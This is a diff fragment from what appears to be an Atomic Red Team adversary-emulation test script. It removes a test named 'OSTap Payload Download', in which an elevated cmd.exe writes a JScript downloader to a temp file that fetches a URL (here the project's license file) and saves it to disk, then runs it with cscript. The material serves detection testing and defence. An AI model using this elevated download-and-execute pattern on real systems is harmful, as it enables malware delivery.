@@ -19,10 +19,3 @@
 
 #Cleanup Commands:
 #Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
-
-#Atomic Test #2 - OSTap Payload Download
-Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js"'
-Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "cscript //E:Jscript %TEMP%\OSTapGet.js"'
-
-#Cleanup Commands:
-#Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "del %TEMP%\OSTapGet.js /F /Q >nul 2>&1"'
